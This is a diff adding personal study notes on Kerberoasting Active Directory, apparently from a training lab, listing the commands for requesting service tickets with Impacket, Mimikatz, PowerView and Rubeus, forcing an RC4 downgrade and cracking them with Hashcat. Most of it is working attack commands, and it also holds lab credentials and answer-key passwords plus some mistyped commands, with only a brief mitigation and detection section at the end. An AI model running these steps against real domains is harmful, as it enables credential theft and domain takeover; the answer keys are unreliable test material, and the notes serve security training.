@@ -1246,3 +1246,165 @@ Several tools can be utilized to perform the attack:
 Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
 A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
 From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts
+\\installing Impacket using pip 
+$sudo python3 -m pip install .
+-this will install all impacket tools in PATH so can call them from any where
+\\Listing GetUserSPNs.py 
+$GetUserSPNs.py -H
+-It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.
+\\Listing SPN Accounts with GetUserSPNs.py
+$GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGH.LOCAL/forend
+-We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
+
+\\Requesting all TGS tickets
+$GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+-We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.
+
+\\Requesting a Single TGS Ticket
+$GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+-With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.
+
+To facilitate offline cracking, it is always good to use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.
+
+\\Saving the TGS Ticket to an Output File
+$GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+
+\\Cracking the TGS offline with Hashcat
+$hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+
+\\Testing Authentication against a Domain Controller
+$sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+
+<test>Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer."
+$ssh htb-student@STMIP
+-Students then need to list SPN accounts on the DC, using the credentials forend:Klmcargo2:
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request SAPService -outputfile sap_tgs
+$hashcat -m 13100 -w 3 -O sap_tgs /usr/share/wordlists/rockyou.txt -force
+
+<test>"What powerful local group on the Domain Controller is the SAPService user a member of?"
+ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
+  !SapperFi2
+
+\\\\\\\\\\\\\\=================================================
+Kerberoasting from window 
+\\Enumerating SPNs with Setspn.exe
+C:>setspn.exe -Q */*
+-PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz. Let's try this by targeting a single user:
+
+\\Targeting a Single User
+PS>Add-Type -AssemblyName System.IdentityModel
+PS>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+\\Retrieving ALL Tickers Using setspn.exe
+PS>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+-Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.
+
+\\Extracting Tickets from Memmory with Mimikatz
+$mimikatz# kerberos::list /export
+-If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.
+-Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.
+
+\\Preparing the Base64 Blob for Cracking
+$sudo "<base64 blob>" | tr -d \\n 
+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
+-We can place the above single line of output into a file and convert it back to a .kirbi file using the base64 utility.
+
+\\Placing the Output into a File as .kirbi
+$cat encoded_file | base64 -d > sqldev.kirbi
+
+Next, we can use version of the kirbi2john.py tool to extract the kerberos ticket from the TGS file
+
+\\Extracting the Kerberos Ticket using kirbi2john.py
+$python2.7 kirbi2john.py sqldev.kirbi
+-this will create a file called crack_file 
+
+\\Modifying crack_file for Hashcat
+$sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+
+\\Viewing the prepared Hash
+$cat sqldev_tgs_hashcat
+
+\\Cracking the Hash with Hashcat
+$hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+-If we decide to skip the base64 output with Mimikatz and type mimikatz # kerberos::list /export, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, skipping the base64 decoding step.
+
+\\Automated / Tool Based Route 
+-Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use PowerView to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.
+
+\\Using PowerView to Enumerate SPN Accounts
+ps>Import-Module .\PowerView.ps1
+ps>Get-DomainUser * -spn | select samaccountname
+From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.
+
+\\Using PowerView to Target a Specific User
+PS>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+\\Export All Tickets to A CSV File
+S C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+
+\\Viewing the Contents of the .csv file
+ps>cat .\ilfreight_tgs.csv
+-We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.
+
+\\Using Rubeus
+PS>.\Rubeus.exe
+
+\\Using the /stats Flag
+ps>.\Rubeus.exe kerberoast /stats
+-the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat
+-/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.
+
+\\Using the /nowrarp Flag
+ps>.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+\\A Note on Encryption Types
+-$krb5tgs$23$*, an RC4 (type 23) encrypted
+- AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*.
+PS>.\Rubeus.exe kerberoast /user:testspn /nowrap
+Let's start by creating an SPN account named testspn and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.
+-Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.
+$PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+\\cracking the Ticket with Hashcat & rockyou.txt
+$hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
+-If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.
+
+\\Checking Supported Encryption Type
+PS>Get-DomainUser testspn -Properties samaccountname,servicepricipalname,msds-supportedencryptiontypes
+-Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type- 18) encryption
+
+\\requesting a New Ticket
+PS>.\Rubeus.exe kerberoast /user:typespn /nowrap
+-To run this through Hashcat, we need to use hash mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) per the handy Hashcat example_hashes table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing s to see the status of the cracking job.
+
+\\Running Hashcat & checking the status of cracking job
+$hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+
+\\Viewing the Length of Time it took to crack
+-use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.
+
+\\Using the /tgtdeleg Flag for faster crack
+ps>.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
+-we could downgrade from AES to RC4 and cut cracking time down by over 4 minutes and 30 seconds. In a real-world engagement where we have a strong GPU password cracking rig at our disposal, this type of downgrade could result in a hash cracking in a few hours instead of a few days and could make or break our assessment.
+
+-Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.
+
+-It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019.
+
+\\Mitigation & Detection
+-An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use Managed Service Accounts (MSA), and Group Managed Service Accounts (gMSA), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.
+-. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting Audit Kerberos Service Ticket Operations within Group Policy.
+-event ID 4769 being logged in succession, which appears to be anomalous behavior. Clicking into one, we can see that a Kerberos service ticket was requested by the htb-student user (attacker) for the sqldev account (target). We can also see that the ticket encryption type is 0x17, which is the hex value for 23 (DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256), meaning that the requested ticket was RC4, so if the password was weak, there is a good chance that the attacker would be able to crack it and gain control of the sqldev account.
+
+<test>What is the name of the service account with the SPN 'vmware/inlanefreight.local'?\
+$xfreerdp /v:ip /u:<user> /p:<pass>
+$setspn.exe -Q */* | Select-String -Parttern "vmware/inlanefreight.local" -Context 1
+svc_vmwaresso
+$.\Rubeus.exe kerberoeast /user:testspn /nowrap
+
+<test>"Crack the password for this account and submit it as your answer."
+cd C:\Tools\
+.\Rubeus.exe kerberoast /usr:svc_vmwaresso /nowrap
+Virtual01
+sudo hashcat -m 13100 -w 3 -O hashcat.txt /usr/share/wordlists/rockyou.txt
+
